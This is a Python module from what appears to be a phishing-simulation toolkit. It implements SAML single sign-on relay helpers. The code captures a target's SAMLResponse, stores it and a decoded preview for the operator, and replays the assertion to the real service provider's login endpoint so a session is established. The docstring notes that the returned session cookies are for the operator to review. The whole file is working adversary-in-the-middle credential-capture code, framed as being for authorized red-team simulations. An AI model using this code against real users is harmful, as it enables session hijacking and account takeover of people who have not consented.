"""SAML/SSO relay helpers for authorized phishing simulations.

The relay endpoint receives a SAMLResponse from an identity provider, stores it
for operator analysis, and optionally forwards it to the real service provider
ACS URL so the victim session is established.
"""

import base64
import json
import logging
from typing import Any

import requests

from dropoutjeep_lib import db
from dropoutjeep_lib.models import Campaign, Recipient, SamlCapture, Event

logger = logging.getLogger(__name__)


def _b64_decode_saml(value: str) -> str:
    """Best-effort base64 decode of a SAMLResponse."""
    try:
        padded = value + "=" * (-len(value) % 4)
        return base64.b64decode(padded).decode("utf-8", errors="replace")
    except Exception:
        return value


def capture_saml_response(
    campaign_id: int,
    recipient_token: str,
    saml_response: str,
    relay_state: str | None = None,
) -> SamlCapture:
    """Persist a captured SAMLResponse and create an event."""
    recipient = Recipient.query.filter_by(token=recipient_token, campaign_id=campaign_id).first()
    capture = SamlCapture(
        campaign_id=campaign_id,
        recipient_id=recipient.id if recipient else None,
        recipient_token=recipient_token,
        saml_response=saml_response,
        relay_state=relay_state,
    )
    db.session.add(capture)
    db.session.add(Event(
        campaign_id=campaign_id,
        recipient_id=recipient.id if recipient else None,
        event_type='saml_response_capture',
        meta=json.dumps({
            'recipient_token': recipient_token,
            'decoded_preview': _b64_decode_saml(saml_response)[:500],
        }, default=str),
    ))
    db.session.commit()
    return capture


def relay_saml_response(
    capture: SamlCapture,
    real_acs_url: str,
    timeout: int = 30,
) -> tuple[bool, int | None]:
    """Forward a captured SAMLResponse to the real service provider ACS.

    Returns (success, status_code). Any captured Set-Cookie headers should be
    reviewed by the operator separately.
    """
    try:
        resp = requests.post(
            real_acs_url,
            data={
                "SAMLResponse": capture.saml_response,
                "RelayState": capture.relay_state or "",
            },
            timeout=timeout,
            allow_redirects=False,
        )
        capture.relayed_to = real_acs_url
        capture.relay_status = str(resp.status_code)
        db.session.commit()
        return True, resp.status_code
    except Exception as exc:
        logger.exception("SAML relay failed: %s", exc)
        capture.relayed_to = real_acs_url
        capture.relay_status = "error"
        db.session.commit()
        return False, None
